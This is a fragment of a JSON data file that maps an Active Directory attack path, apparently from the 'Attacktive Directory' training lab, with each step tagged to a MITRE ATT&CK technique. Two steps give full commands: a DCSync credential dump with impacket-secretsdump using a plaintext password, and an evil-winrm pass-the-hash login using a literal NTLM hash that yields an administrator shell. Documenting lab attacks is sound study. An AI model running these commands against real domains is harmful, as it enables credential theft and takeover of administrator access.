  "steps": [
    {
      "id": 1,
      "name": "Launch secretsdump DCSync",
      "type": "edge",
      "from": "attacker_machine",
      "to": "secretsdump_tool",
      "description": "The attacker starts secretsdump to perform a DCSync-style credential pull from the Domain Controller.",
      "cli": "impacket-secretsdump spookysec.local/backup:backup2517860@attacktivedirectory"
    },
    {
      "id": 2,
      "name": "Reach Domain Replication Path",
      "type": "edge",
      "from": "secretsdump_tool",
      "to": "corporate_network",
      "description": "The DCSync client reaches the domain replication path exposed by the Domain Controller."
    },
    {
      "id": 3,
      "name": "Receive Domain NTLM Material",
      "type": "edge",
      "from": "domain_controller",
      "to": "ntlm_hashes",
      "description": "The Domain Controller returns NTLM hash material through the replication workflow.",
      "mitre": {
        "id": "T1003.006",
        "tactic": "Credential Access",
        "technique": "OS Credential Dumping: DCSync"
      }
    },
    {
      "id": 4,
      "name": "Load Chosen Hash into Evil-WinRM",
      "type": "edge",
      "from": "ntlm_hashes",
      "to": "psexec_tool",
      "description": "A useful NTLM hash is selected and prepared for a remote WinRM login.",
      "cli": "evil-winrm -i attacktivedirectory -u administrator -H 0e0363213e37b94221497260b0bcb4fc"
    },
    {
      "id": 5,
      "name": "Reach Remote WinRM Service",
      "type": "edge",
      "from": "psexec_tool",
      "to": "corporate_network",
      "description": "The attacker reaches the target host's WinRM service using the selected NTLM material."
    },
    {
      "id": 6,
      "name": "Establish Remote Administrative Shell",
      "type": "edge",
      "from": "corporate_network",
      "to": "target_machine",
      "description": "The target accepts the reused hash and returns a remote administrative shell.",
      "mitre": {
        "id": "T1550.002",
        "tactic": "Lateral Movement",
        "technique": "Use Alternate Authentication Material: Pass the Hash"
      }
    }
  ],
  "attackMatrixOpen": false,
